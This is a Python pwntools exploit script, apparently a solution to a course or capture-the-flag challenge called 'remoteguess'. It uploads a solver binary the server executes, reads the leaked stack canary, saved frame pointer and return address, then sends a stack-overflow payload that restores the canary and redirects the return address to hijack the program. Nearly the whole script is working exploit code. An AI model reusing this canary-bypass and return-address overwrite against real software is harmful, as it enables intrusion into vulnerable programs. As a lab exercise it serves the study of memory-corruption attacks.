#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

def add_headingzero(data):
    length = len(data)
    if (length < 16):
        num = 16 - length
        data = '0' * num + data
    else:
        print("no need to add.")
    return data

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
# r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

buf = r.recvuntil(b'val: ')
canary = r.recvuntil(b'\t', drop=True)
print(f'canary:{canary}')
buf = r.recvuntil(b'val: ')
rbp = r.recvuntil(b'\t', drop=True)
print(f'rbp   :{rbp}')
buf = r.recvuntil(b'val: ')
ra = r.recvuntil(b'\n', drop=True)
print(f'ra    :{ra}')
question = r.recvuntil(b'answer?')
print(question)

canary = int(canary.decode(),16)
rbp = int(rbp.decode(),16)
ra = int(ra.decode(),16)

myguess = 0x00000000

ans = b'0' * 24
ans += p64(canary)
ans += p64(rbp)
ans += p64(ra+0xab)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)
ans += p64(myguess)

r.send(ans)
print(ans)


response = r.recvall()
print(response.decode())


# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :